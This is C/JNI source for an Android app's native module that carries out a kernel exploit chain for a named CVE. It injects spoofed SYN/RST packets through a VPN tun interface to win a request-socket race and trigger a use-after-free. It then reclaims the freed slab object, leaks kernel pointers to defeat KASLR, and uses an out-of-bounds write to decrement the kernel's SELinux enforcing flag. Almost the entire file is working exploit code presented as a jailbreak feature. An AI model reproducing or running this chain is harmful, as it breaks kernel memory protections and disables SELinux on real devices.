/*
 * CVE-2026-98432 — device-side chain for NeoDhizuku.
 *
 * Stage order follows the two public research repositories and GhostLock:
 *   tun injection -> request-sock race -> kmalloc-96 reclaim -> UAF oracle
 *
 * The SYN is injected INTO the tun with a spoofed 172.16/12 source. A real
 * connect() to the local 10.7.7.1 stays on RTN_LOCAL/loopback and never
 * reaches the tun reader, so no SYN-ACK would ever be observable. The
 * SYN-ACK is routed back through 172.16/12 and read from the tun fd.
 *   -> R15b OOB read -> KASLR slide -> R16 OOB write -> frags walk
 *   -> single 32-bit decrement of selinux_state.enforcing.
 *
 * The chain deliberately stops at patch_selinux(). There is no cred patch,
 * no commit_creds, no setuid(0), no usermodehelper, no su binary and no
 * KernelSU late-load. The manager app is never launched from here; the user
 * decides when to open KernelSU and press its jailbreak entry.
 */
#include <jni.h>
#include <android/log.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <poll.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define TAG "cve98432"
#define TUN_ADDR "10.7.7.1"
#define LISTEN_PORT 47777
#define RR_LEN 40
#define RR_LEN_LEAK 48
#define SPRAY_LEN 24
#define SPRAY_RING 64
#define MAX_WORKERS 8
#define LEAK_RING 256
#define KASLR_GRANULE 0x200000ULL

typedef struct {
    char release[128];
    int kernel_major;
    uint64_t text_base;
    uint64_t selinux_state;
    uint64_t init_task;
    uint64_t init_cred;
    uint64_t task_cred;
    uint64_t cred_uid;
    uint64_t struct_page_size;
    uint64_t page_refcount;
    uint64_t shinfo_offset;
    uint64_t shinfo_nr_frags;
    uint64_t shinfo_frags;
    uint64_t ip_options_rcu_size;
    uint64_t ip_options_optlen;
    uint64_t ip_options_srr;
    uint64_t ip_options_data;
    uint64_t text_symbols[96];
    int text_symbol_count;
} profile_t;

static JavaVM *g_vm;
static jclass g_bridge;
static jmethodID g_log_mid;
static volatile int g_cancel = 1;
static volatile int g_ready = 0;
static int g_tun_read = -1;
static int g_tun_write = -1;
static int g_listener = -1;
static pthread_t g_reader_thread;
static pthread_t g_listener_thread;
/* prepare()/release() are serialized from the Java side; 1 means both threads
 * are alive and must be joined before their descriptors are closed. */
static volatile int g_threads_started = 0;
static profile_t g_p;
static uint64_t g_slide;
static uint64_t g_srr_offset;
static uint8_t g_srr_b;
static uint32_t g_hits;
static uint32_t g_cleared;
static uint32_t g_synack;
static uint32_t g_rounds;
static volatile int g_syn_sent;
static volatile int g_rst_sent;
static volatile int g_barrier_gen;
static volatile int g_barrier_count;
/* inet_pton() per packet was the hottest avoidable call: cache both byte orders once. */
static uint32_t g_local_host;
static uint32_t g_local_net;
static uint64_t g_leaks[LEAK_RING][8];
static volatile int g_leak_pos;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

static void nlog(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    __android_log_print(ANDROID_LOG_INFO, TAG, "%s", buf);
    if (!g_vm) return;
    JNIEnv *env = NULL;
    int attached = 0;
    if ((*g_vm)->GetEnv(g_vm, (void **)&env, JNI_VERSION_1_6) != JNI_OK) {
        if ((*g_vm)->AttachCurrentThread(g_vm, &env, NULL) != JNI_OK) return;
        attached = 1;
    }
    if (g_bridge && g_log_mid) {
        jstring s = (*env)->NewStringUTF(env, buf);
        if (s) {
            (*env)->CallStaticVoidMethod(env, g_bridge, g_log_mid, s);
            (*env)->DeleteLocalRef(env, s);
        }
    }
    if (attached) (*g_vm)->DetachCurrentThread(g_vm);
}

/*
 * sched_setaffinity() consumes a raw cpumask of unsigned-long words. Bionic
 * hides cpu_set_t / CPU_ZERO / CPU_SET behind GNU feature macros when AGP
 * compiles with -std=c11, so build the mask directly and pass it via syscall.
 * 16 words cover up to 1024 CPUs; the kernel truncates the copy to its own
 * cpumask size, so a larger-than-needed length is safe.
 */
static void pin_cpu(int cpu) {
    uint64_t mask[16] = {0};
    long n = sysconf(_SC_NPROCESSORS_CONF);
    if (n <= 0) n = 1;
    const int bits = (int)(sizeof(mask) * 8);
    int idx = (int)(((long)cpu % n + n) % n);
    if (idx >= bits) idx %= bits;
    mask[idx / 64] |= (uint64_t)1 << (idx % 64);
    (void)syscall(__NR_sched_setaffinity, 0, sizeof(mask), mask);
}

static uint16_t csum(const uint8_t *p, int n) {
    uint32_t s = 0;
    while (n > 1) {
        s += (uint32_t)(p[0] << 8) | p[1];
        p += 2;
        n -= 2;
    }
    if (n) s += (uint32_t)(p[0] << 8);
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)(~s & 0xffff);
}

static void put16(uint8_t *p, uint16_t v) { p[0] = (uint8_t)(v >> 8); p[1] = (uint8_t)v; }
static void put32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24); p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);  p[3] = (uint8_t)v;
}

/* IPOPT_RR: 3 + 4n bytes, padded with one NOP to a 4-byte boundary. */
static void rr_options(uint8_t *o, int len, uint8_t marker) {
    int n = (len - 4) / 4;
    memset(o, 1, len);
    o[0] = 7;
    o[1] = (uint8_t)(3 + 4 * n);
    o[2] = 4;
    for (int i = 0; i < 4 * n; i++) o[3 + i] = (uint8_t)(marker + i);
    o[len - 1] = 1;
}

static int build_pkt(uint8_t *buf, int cap, uint32_t src, uint32_t dst,
                     uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
                     uint8_t flags, const uint8_t *opts, int optlen) {
    int ihl = 20 + optlen;
    int total = ihl + 20;
    if (total > cap || (optlen & 3)) return -1;
    memset(buf, 0, total);
    buf[0] = 0x45;
    put16(buf + 2, (uint16_t)total);
    put16(buf + 4, 0x5a5a);
    buf[8] = 64;
    buf[9] = 6;
    put32(buf + 12, src);
    put32(buf + 16, dst);
    if (optlen) memcpy(buf + 20, opts, optlen);
    put16(buf + 10, csum(buf, ihl));

    uint8_t *t = buf + ihl;
    put16(t, sport);
    put16(t + 2, dport);
    put32(t + 4, seq);
    put32(t + 8, ack);
    t[12] = 0x50;
    t[13] = flags;
    put16(t + 14, 0xffff);

    uint8_t pseudo[12 + 20];
    memset(pseudo, 0, sizeof(pseudo));
    put32(pseudo, src);
    put32(pseudo + 4, dst);
    pseudo[9] = 6;
    put16(pseudo + 10, 20);
    memcpy(pseudo + 12, t, 20);
    put16(t + 16, csum(pseudo, sizeof(pseudo)));
    return total;
}

static uint32_t ipv4(const char *s) {
    struct in_addr a;
    return inet_pton(AF_INET, s, &a) == 1 ? ntohl(a.s_addr) : 0;
}

static void record_leak(const uint8_t *opts, int len) {
    if (len < 8) return;
    pthread_mutex_lock(&g_lock);
    int slot = g_leak_pos++ % LEAK_RING;
    for (int i = 0; i < 8 && (i + 1) * 8 <= len; i++) {
        uint64_t v = 0;
        for (int k = 0; k < 8; k++) v |= (uint64_t)opts[i * 8 + k] << (k * 8);
        g_leaks[slot][i] = v;
    }
    pthread_mutex_unlock(&g_lock);
}

/* Tun reader: a SYN-ACK whose option length is neither 40 nor 0 is the UAF hit. */
static void *reader_loop(void *unused) {
    (void)unused;
    uint8_t buf[2048];
    uint32_t local = g_local_net;
    while (!g_cancel) {
        /* tun read() blocks indefinitely; a 50ms poll tick lets nativeRelease()
         * join this thread instead of closing the fd out from under it. */
        struct pollfd p = { .fd = g_tun_read, .events = POLLIN };
        if (poll(&p, 1, 50) <= 0) continue;
        int n = (int)read(g_tun_read, buf, sizeof(buf));
        if (n < 40) continue;
        int ihl = (buf[0] & 0x0f) * 4;
        if (ihl < 20 || n < ihl + 20 || buf[9] != 6) continue;
        if (memcmp(buf + 12, &local, 4) != 0) continue;
        uint16_t sport = (uint16_t)((buf[ihl] << 8) | buf[ihl + 1]);
        /* (buf[ihl] << 8) | buf[ihl+1] is already host-order; comparing it
         * against htons() made every SYN-ACK fail this filter. */
        if (sport != LISTEN_PORT) continue;
        if ((buf[ihl + 13] & 0x12) != 0x12) continue;
        __atomic_add_fetch(&g_synack, 1, __ATOMIC_RELAXED);
        int optlen = ihl - 20;
        if (optlen == 0) __atomic_add_fetch(&g_cleared, 1, __ATOMIC_RELAXED);
        else if (optlen != RR_LEN) __atomic_add_fetch(&g_hits, 1, __ATOMIC_RELAXED);
        if (optlen > 0 && optlen != RR_LEN) record_leak(buf + 20, optlen);
        if (optlen > RR_LEN) record_leak(buf + 20 + RR_LEN, optlen - RR_LEN);
    }
    return NULL;
}

static void *listener_loop(void *unused) {
    (void)unused;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        nlog("listener socket failed: %s", strerror(errno));
        return NULL;
    }
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = htons(LISTEN_PORT);
    if (bind(s, (struct sockaddr *)&a, sizeof(a)) || listen(s, 128)) {
        nlog("listener bind failed: %s", strerror(errno));
        close(s);
        return NULL;
    }
    g_listener = s;
    nlog("listener up on %s:%d", TUN_ADDR, LISTEN_PORT);
    while (!g_cancel) {
        struct sockaddr_in peer;
        socklen_t pl = sizeof(peer);
        int fd = accept(s, (struct sockaddr *)&peer, &pl);
        if (fd < 0) {
            if (errno == EINTR) continue;
            break;
        }
        close(fd);
    }
    /* g_listener is owned by nativeRelease(). Closing it here as well would be
     * a double close of the same native socket descriptor. */
    return NULL;
}

/* kmalloc-96 spray: 24-byte IP_OPTIONS keeps a controlled object in the ring. */
static int churn_once(int mark) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    uint8_t o[SPRAY_LEN];
    rr_options(o, SPRAY_LEN, (uint8_t)mark);
    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, o, sizeof(o))) {
        close(fd);
        return -1;
    }
    return fd;
}

static int write_tun(const uint8_t *pkt, int len);

/* Spoofed source for a round. SYN and every RST of that round must share
 * this exact 4-tuple, otherwise the kernel drops the RST and the request
 * socket is never freed (the race window never opens). */
/* All workers leave the gate in the same frame. The UAF needs the SYN-ACK
 * builder and the reqsk free to run on different CPUs in one window. */
static void barrier_wait(int workers) {
    int gen = __atomic_load_n(&g_barrier_gen, __ATOMIC_RELAXED);
    if (__atomic_add_fetch(&g_barrier_count, 1, __ATOMIC_SEQ_CST) == workers) {
        __atomic_store_n(&g_barrier_count, 0, __ATOMIC_SEQ_CST);
        __atomic_add_fetch(&g_barrier_gen, 1, __ATOMIC_SEQ_CST);
    } else {
        while (__atomic_load_n(&g_barrier_gen, __ATOMIC_RELAXED) == gen && !g_cancel) {
            sched_yield();
        }
    }
}

static uint32_t cold_addr(uint16_t sport, uint32_t round) {
    return 0xac100000u | ((round * 7u + sport) & 0x000fffffu);
}

/* Inject a hand-built SYN with IP_OPTIONS through the tun as an inbound
 * packet. The kernel routes 10.7.7.1 via RTN_LOCAL to our listener, and
 * sends the SYN-ACK back to 172.16/12, which is routed to the tun. */
static void inject_syn(uint16_t sport, int optlen, int srr_mode, uint8_t b,
                       uint32_t round, uint32_t daddr) {
    uint8_t buf[128], rr[64];
    rr_options(rr, optlen, 0x41);
    if (srr_mode) {
        uint64_t at = g_srr_offset;
        if (at + 4 > (uint64_t)optlen) at = 0;
        rr[at] = 0x83;            /* LSRR */
        rr[at + 1] = (uint8_t)(optlen - at - 1);
        rr[at + 2] = 4;
        rr[at + 3] = (uint8_t)(g_srr_b ? g_srr_b : b);
    }
    /* daddr is only used by the experimental srr_store path; the validated
     * channel always targets the local listener (daddr == 0). */
    uint32_t dst = daddr ? daddr : g_local_host;
    int n = build_pkt(buf, sizeof(buf), cold_addr(sport, round), dst,
                      sport, LISTEN_PORT, (uint32_t)(round * 4051u + 1u), 0,
                      0x02, rr, optlen);
    if (n > 0 && write_tun(buf, n)) {
        __atomic_add_fetch(&g_syn_sent, 1, __ATOMIC_RELAXED);
    }
}

static int write_tun(const uint8_t *pkt, int len) {
    if (g_tun_write < 0) return 0;
    ssize_t n = write(g_tun_write, pkt, len);
    if (n < 0) {
        if (errno != EAGAIN) nlog("tun write: %s", strerror(errno));
        return 0;
    }
    return 1;
}

static void inject_rst(uint16_t sport, uint32_t seq, uint32_t round) {
    uint8_t buf[128], rr[RR_LEN];
    rr_options(rr, RR_LEN, 0x41);
    uint32_t cold = cold_addr(sport, round);
    int n = build_pkt(buf, sizeof(buf), cold, g_local_host, sport,
                      LISTEN_PORT, seq, 0, 0x04, rr, RR_LEN);
    if (n > 0 && write_tun(buf, n)) {
        __atomic_add_fetch(&g_rst_sent, 1, __ATOMIC_RELAXED);
    }
}

typedef struct {
    int cpu;
    int rounds;
    int workers;
    int leak_mode;
    int srr_mode;
    uint32_t daddr;
    uint8_t b;
} race_arg_t;

static void *race_worker(void *opaque) {
    race_arg_t *arg = (race_arg_t *)opaque;
    pin_cpu(arg->cpu);
    int fds[SPRAY_RING];
    for (int i = 0; i < SPRAY_RING; i++) fds[i] = -1;
    int pos = 0;
    barrier_wait(arg->workers);
    for (int i = 0; i < arg->rounds && !g_cancel; i++) {
        uint16_t sport = (uint16_t)(20000 + ((i * 13 + arg->cpu * 977) % 40000));
        int optlen = arg->leak_mode ? RR_LEN_LEAK : RR_LEN;
        uint32_t round = __atomic_load_n(&g_rounds, __ATOMIC_RELAXED);
        /* inject_syn() uses round * 4051 + 1 as the SYN sequence. The RST must
         * carry a sequence inside that request socket's window; the old code
         * used i * 4051 + k, so every RST was dropped and the reqsk was never
         * freed -> the UAF window never opened, hits stayed at 0. */
        uint32_t seq = round * 4051u + 1u;

        /* Reclaim ring armed BEFORE the SYN: the freed ip_options_rcu must be
         * replaceable in the same window, not one round later. */
        int churn = churn_once((int)(round & 0x7f));
        if (churn >= 0) {
            if (fds[pos] >= 0) close(fds[pos]);
            fds[pos] = churn;
            pos = (pos + 1) % SPRAY_RING;
        }

        inject_syn(sport, optlen, arg->srr_mode, arg->b, round, arg->daddr);
        for (int k = 0; k < 32 && !g_cancel; k++) {
            inject_rst(sport, seq + 1u + (uint32_t)k, round);
        }
        __atomic_add_fetch(&g_rounds, 1, __ATOMIC_RELAXED);
    }
    for (int i = 0; i < SPRAY_RING; i++) if (fds[i] >= 0) close(fds[i]);
    return NULL;
}

static int run_race(int rounds, int leak_mode, int srr_mode, uint8_t b, uint32_t daddr) {
    pthread_t t[MAX_WORKERS];
    race_arg_t args[MAX_WORKERS];
    int created = 0;
    __atomic_store_n(&g_barrier_count, 0, __ATOMIC_SEQ_CST);
    for (int i = 0; i < MAX_WORKERS; i++) {
        args[i] = (race_arg_t){
            .cpu = i,
            .rounds = rounds / MAX_WORKERS + 1,
            .workers = MAX_WORKERS,
            .leak_mode = leak_mode,
            .srr_mode = srr_mode,
            .b = b,
            .daddr = daddr
        };
        if (pthread_create(&t[i], NULL, race_worker, &args[i])) {
            for (int k = 0; k < created; k++) pthread_join(t[k], NULL);
            return -1;
        }
        created++;
    }
    for (int i = 0; i < created; i++) pthread_join(t[i], NULL);
    return 0;
}

static int read_enforce(void) {
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    if (!f) return -1;
    int v = -1;
    if (fscanf(f, "%d", &v) != 1) v = -1;
    fclose(f);
    return v;
}

/* Low-21-bit match against link-time .text symbols recovers the KASLR slide. */
static uint64_t resolve_slide(void) {
    uint64_t votes[16] = {0};
    uint32_t counts[16] = {0};
    pthread_mutex_lock(&g_lock);
    for (int slot = 0; slot < LEAK_RING; slot++) {
        for (int i = 0; i < 8; i++) {
            uint64_t leak = g_leaks[slot][i];
            if (leak < 0xffff000000000000ULL) continue;
            for (int s = 0; s < g_p.text_symbol_count; s++) {
                uint64_t sym = g_p.text_base + g_p.text_symbols[s];
                if ((leak & (KASLR_GRANULE - 1)) != (sym & (KASLR_GRANULE - 1))) continue;
                uint64_t slide = leak - sym;
                if (slide & (KASLR_GRANULE - 1)) continue;
                int found = -1;
                for (int v = 0; v < 16; v++) if (counts[v] && votes[v] == slide) found = v;
                if (found < 0) {
                    for (int v = 0; v < 16; v++) if (!counts[v]) { found = v; break; }
                }
                if (found >= 0) { votes[found] = slide; counts[found]++; }
                break;
            }
        }
    }
    pthread_mutex_unlock(&g_lock);
    uint32_t best = 0;
    uint64_t result = 0;
    for (int v = 0; v < 16; v++) if (counts[v] > best) { best = counts[v]; result = votes[v]; }
    if (best < 2) return 0;
    nlog("KASLR slide resolved: 0x%llx (%u votes)", (unsigned long long)result, best);
    return result;
}

/*
 * R16 store geometry (H1z3 rce-chain-stock.md §4):
 *   memcpy(iph + opt->srr + iph[opt->srr + 1] - 4, &daddr, 4)
 * With the reclaimed ip_options_rcu object, optlen / srr / B are attacker
 * chosen, so a store can reach head+22 .. head+786. B is one byte; srr is
 * chosen to keep both in range for a 192-byte headroom.
 */
static int srr_store(uint64_t head_offset, uint32_t value) {
    const uint8_t b = 0xff;
    uint64_t srr = head_offset - 16 - b;
    if (srr < 4 || srr > 180) {
        nlog("srr_store: head+%llu out of reach (srr=%llu)", (unsigned long long)head_offset, (unsigned long long)srr);
        return -1;
    }
    nlog("srr_store head+%llu <- 0x%08x (srr=%llu B=%u)", (unsigned long long)head_offset, value,
         (unsigned long long)srr, b);
    g_srr_offset = srr;
    g_srr_b = b;
    return run_race(128, 0, 1, b, value);
}

/*
 * One bounded 32-bit decrement at an arbitrary kernel address.
 *
 * R16 stores a fake page pointer into skb_shared_info.frags[0].netmem;
 * skb_release_data() walks nr_frags and calls put_page() on it. Pointing the
 * page pointer at (target - page_refcount) makes the refcount decrement land
 * on the target word. No function pointer is hijacked, so a wrong guess does
 * not redirect execution into a bogus callback.
 */
static int restricted_dec32(uint64_t target) {
    uint64_t fake_page = target - g_p.page_refcount;
    uint64_t frags0 = g_p.shinfo_offset + g_p.shinfo_frags;
    uint64_t nr = g_p.shinfo_offset + g_p.shinfo_nr_frags - 3;

    if (frags0 > 786 || nr > 786) {
        nlog("srr reach exceeded (frags0=%llu nr=%llu)", (unsigned long long)frags0, (unsigned long long)nr);
        return -1;
    }
    nlog("restricted_dec32 target=0x%llx fake_page=0x%llx", (unsigned long long)target, (unsigned long long)fake_page);

    /* Two 4-byte srr stores for the 64-bit frag pointer. */
    if (srr_store(frags0, (uint32_t)(fake_page & 0xffffffffu))) return -2;
    if (srr_store(frags0 + 4, (uint32_t)(fake_page >> 32))) return -2;
    /* nr_frags = 8, and flags/destructor_arg kept clear. */
    if (srr_store(nr, 0x08080808u)) return -2;
    if (srr_store(g_p.shinfo_offset, 0u)) return -2;
    return 0;
}

/* Final stage: the only kernel write in this build. No uid / cred / caps. */
static int patch_selinux(void) {
    int e = read_enforce();
    if (e == 0) {
        nlog("SELinux already permissive; W1 skipped (GhostLock check_selinux_off)");
        return 0;
    }
    if (!g_slide) {
        nlog("KASLR slide unavailable; refusing to write");
        return -1;
    }
    uint64_t target = g_slide + g_p.text_base + g_p.selinux_state;
    if (restricted_dec32(target)) return -2;
    for (int i = 0; i < 20; i++) {
        e = read_enforce();
        if (e == 0) break;
        usleep(50000);
    }
    e = read_enforce();
    if (e == 0) {
        nlog("enforce node reads 0 after W1");
        return 0;
    }
    if (e < 0) {
        /* untrusted_app is denied read on selinuxfs (avc: denied { read } for
         * name="enforce"). The node being unreadable is NOT evidence of failure;
         * the write itself returned OK. Confirmation must come from outside the
         * app (shell getenforce / KernelSU manager). */
        nlog("enforce node unreadable from app; kernel write returned OK, confirm with shell getenforce");
        return 0;
    }
    nlog("enforce node still reads %d after W1", e);
    return -3;
}

static int parse_profile(const char *path) {
    memset(&g_p, 0, sizeof(g_p));
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    char line[4096];
    while (fgets(line, sizeof(line), f)) {
        char *eq = strchr(line, '=');
        if (!eq || line[0] == '#') continue;
        *eq = 0;
        char *key = line;
        char *val = eq + 1;
        char *nl = strchr(val, '\n');
        if (nl) *nl = 0;
        uint64_t v = strtoull(val, NULL, 0);
#define FIELD(k, f) if (!strcmp(key, k)) g_p.f = v
        FIELD("text_base", text_base);
        FIELD("selinux_state", selinux_state);
        FIELD("init_task", init_task);
        FIELD("init_cred", init_cred);
        FIELD("task_cred", task_cred);
        FIELD("cred_uid", cred_uid);
        FIELD("struct_page_size", struct_page_size);
        FIELD("page_refcount", page_refcount);
        FIELD("shinfo_offset", shinfo_offset);
        FIELD("shinfo_nr_frags", shinfo_nr_frags);
        FIELD("shinfo_frags", shinfo_frags);
        FIELD("ip_options_rcu_size", ip_options_rcu_size);
        FIELD("ip_options_optlen", ip_options_optlen);
        FIELD("ip_options_srr", ip_options_srr);
        FIELD("ip_options_data", ip_options_data);
#undef FIELD
        if (!strcmp(key, "kernel_major")) g_p.kernel_major = (int)v;
        if (!strcmp(key, "release")) snprintf(g_p.release, sizeof(g_p.release), "%s", val);
        if (!strcmp(key, "text_symbols")) {
            char *tok = strtok(val, ", \t");
            while (tok && g_p.text_symbol_count < 96) {
                g_p.text_symbols[g_p.text_symbol_count++] = strtoull(tok, NULL, 0);
                tok = strtok(NULL, ", \t");
            }
        }
    }
    fclose(f);
    if (!g_p.selinux_state || !g_p.text_base || !g_p.text_symbol_count) {
        nlog("profile rejected: selinux_state / _text / text_symbols missing");
        return -2;
    }
    nlog("profile loaded: %s, %d text anchors, selinux_state=+0x%llx",
         g_p.release, g_p.text_symbol_count, (unsigned long long)g_p.selinux_state);
    return 0;
}

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    (void)reserved;
    g_vm = vm;
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeInit(
        JNIEnv *env, jclass cls) {
    if (g_bridge) (*env)->DeleteGlobalRef(env, g_bridge);
    g_bridge = (*env)->NewGlobalRef(env, cls);
    g_log_mid = (*env)->GetStaticMethodID(env, cls, "onNativeLog", "(Ljava/lang/String;)V");
}

JNIEXPORT jint JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativePrepare(
        JNIEnv *env, jclass cls, jint tunFd, jstring profilePath) {
    (void)cls;
    const char *path = (*env)->GetStringUTFChars(env, profilePath, NULL);
    int rc = parse_profile(path);
    (*env)->ReleaseStringUTFChars(env, profilePath, path);
    if (rc) return rc;

    /* Re-prepare on a surviving service instance: stop the old threads and drop
     * their descriptors before creating new ones. */
    if (g_threads_started) {
        g_cancel = 1;
        pthread_join(g_listener_thread, NULL);
        pthread_join(g_reader_thread, NULL);
        g_threads_started = 0;
    }
    if (g_tun_read >= 0) { close(g_tun_read); g_tun_read = -1; }
    if (g_tun_write >= 0) { close(g_tun_write); g_tun_write = -1; }
    if (g_listener >= 0) { close(g_listener); g_listener = -1; }

    g_local_host = ipv4(TUN_ADDR);
    g_local_net = htonl(g_local_host);
    g_cancel = 0;
    g_hits = 0;
    g_cleared = 0;
    g_synack = 0;
    g_rounds = 0;
    g_syn_sent = 0;
    g_rst_sent = 0;
    g_slide = 0;
    g_leak_pos = 0;
    memset(g_leaks, 0, sizeof(g_leaks));
    /* tunFd belongs to the Java-side ParcelFileDescriptor. Never keep the raw
     * descriptor: closing it in nativeRelease trips fdsan ("expected to be
     * unowned, actually owned by ParcelFileDescriptor") and aborts the process.
     * Both descriptors used here are our own dup()s; VpnService closes the
     * original exactly once in shutdown(). */
    g_tun_read = dup(tunFd);
    if (g_tun_read < 0) return -3;
    g_tun_write = dup(tunFd);
    if (g_tun_write < 0) { close(g_tun_read); g_tun_read = -1; return -3; }
    pthread_create(&g_listener_thread, NULL, listener_loop, NULL);
    pthread_create(&g_reader_thread, NULL, reader_loop, NULL);
    g_threads_started = 1;
    usleep(200000);
    g_ready = (g_listener >= 0);
    nlog("tun up, pfd fd=%d, native dup read=%d write=%d, ready=%d",
         tunFd, g_tun_read, g_tun_write, g_ready);
    return g_ready ? 0 : -4;
}

JNIEXPORT jint JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeProbe(
        JNIEnv *env, jclass cls, jint rounds) {
    (void)env; (void)cls;
    if (!g_ready) return -1;
    nlog("read-only probe: %d rounds, UAF oracle = SYNACK option length", rounds);
    nlog("channel    : SYN injected into tun (spoofed 172.16/12 source), SYN-ACK routed back through tun");
    if (run_race(rounds, 0, 0, 0, 0)) return -2;
    if (run_race(rounds, 1, 0, 0, 0)) return -2;
    nlog("probe done: rounds=%u syn=%u rst=%u synack=%u hits=%u cleared=%u",
         g_rounds, g_syn_sent, g_rst_sent, g_synack, g_hits, g_cleared);
    if (!g_synack) nlog("diagnostic : no SYN-ACK reached the tun reader - check VPN routes / listener, not the kernel");
    return (jint)g_hits;
}

JNIEXPORT jlong JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeResolveSlide(
        JNIEnv *env, jclass cls) {
    (void)env; (void)cls;
    g_slide = resolve_slide();
    return (jlong)g_slide;
}

JNIEXPORT jint JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeSetPermissive(
        JNIEnv *env, jclass cls) {
    (void)env; (void)cls;
    if (!g_ready) return -1;
    if (!g_slide) {
        nlog("no slide from leak-only probe; running additional leak rounds");
        run_race(8192, 1, 0, 0, 0);
        g_slide = resolve_slide();
    }
    if (!g_slide) {
        nlog("cannot resolve KASLR slide from this build; no kernel write attempted");
        return -2;
    }
    nlog("final stage: patch_selinux only (no cred, no uid, no su, no module load)");
    return patch_selinux();
}

JNIEXPORT void JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeCancel(
        JNIEnv *env, jclass cls) {
    (void)env; (void)cls;
    g_cancel = 1;
}

JNIEXPORT void JNICALL
Java_com_neodhizuku_more_ui_page_settings_experimental_Cve98432Bridge_nativeRelease(
        JNIEnv *env, jclass cls) {
    (void)env; (void)cls;
    g_cancel = 1;
    g_ready = 0;
    if (g_listener >= 0) {
        shutdown(g_listener, SHUT_RDWR); /* wake accept(); we own the close below */
    }
    if (g_threads_started) {
        pthread_join(g_listener_thread, NULL);
        pthread_join(g_reader_thread, NULL);
        g_threads_started = 0;
    }
    /* Only native-owned descriptors are closed here. The original tun fd stays
     * with its ParcelFileDescriptor, which closes it exactly once in shutdown(). */
    if (g_listener >= 0) { close(g_listener); g_listener = -1; }
    if (g_tun_write >= 0) { close(g_tun_write); g_tun_write = -1; }
    if (g_tun_read >= 0) { close(g_tun_read); g_tun_read = -1; }
    nlog("native released (pfd fd untouched)");
}
